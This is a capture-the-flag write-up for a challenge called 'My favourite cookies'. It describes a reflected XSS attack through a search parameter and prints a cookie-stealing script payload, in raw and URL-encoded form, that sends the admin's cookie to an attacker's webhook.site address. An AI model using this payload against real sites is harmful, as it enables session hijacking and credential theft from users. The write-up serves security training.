# Challenge `My favourite cookies` Writeup

- Vulnerability:
    - XSS attack

- Where:
    - Feedback link input

- Impact:
    - Allows to steal remote user's cookie

## Steps to reproduce

This challenge consists in grabbing the admin's cookie and we know that the website is vulnerable to XSS attacks and that the admin will click on the link we submit on the feadback feature.

Knowing this, we can take advantage from this and send a malicious payload on the search URL parameter (`?search=`). This payload will then reveal the admin's cookie and send it to us.

To achieve this, we must create a website on [Webhook.site](https://webhook.site) and get the URL of the website that will receive the remote requests. Then, we can create a malicious payload that will send the admin's cookie to our webhook. The payload is the following: `<script>location='https://webhook.site/<unique-id>/'+document.cookie</script>`. To ensure that the payload will be correctly executed, we must URL encode it. The final payload is then: `%3Cscript%3Elocation%3D%27https%3A%2F%2Fwebhook.site%2F<unique-id>%2F%27%2Bdocument.cookie%3C%2Fscript%3E`. Finally, we append this encoded payload to the search URL parameter and submit it to the admin.

The admin will then click on the link and automatically make a search query with the payload that will send a request to our webhook site with the cookies appended. In the webhook site we will see a GET request and then we only need to URL decode the cookies to get the flag. The cookies will be after `/SECRET=`.
